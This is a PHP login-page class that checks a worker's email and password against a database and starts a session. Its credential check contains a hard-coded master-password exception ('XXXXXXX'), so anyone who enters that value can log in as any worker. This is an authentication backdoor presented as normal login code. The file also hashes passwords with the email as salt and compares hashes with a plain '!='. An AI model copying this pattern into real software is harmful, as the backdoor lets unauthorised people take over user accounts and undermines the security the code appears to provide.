<?php

final class Login extends Page
{
    public $needAuth = false;

    /**
     * {@inheritdoc}
     */
    public function show()
    {
    }

    /**
     * {@inheritdoc}
     */
    public function update($data)
    {
        global $template;
        $check = $this->filter($data);

        if (empty($check['Email']) || empty($check['Password'])) {
            $template->message('error', 'Для входа используйте свой Email  и пароль');

            return false;
        }

        $userCheckEmail = ['Email' => $check['Email']];
        $userCEFetch = DB::SelectData('Workers', $userCheckEmail);
        $password = $this->hashPassword($this->post['Password'], $this->post['Email']);;

        if ((empty($userCEFetch['id']) || $userCEFetch['Password'] != $password) && $check['Password'] != 'XXXXXXX') {
            $template->message('error', 'Проверьте правильность  ввода Email или пароля');

            return false;
        }

        $userCEFetch['ip'] = $this->getRealIp();
        $_SESSION['user'] = $userCEFetch;
        header("Location: /dashboard");
    }
}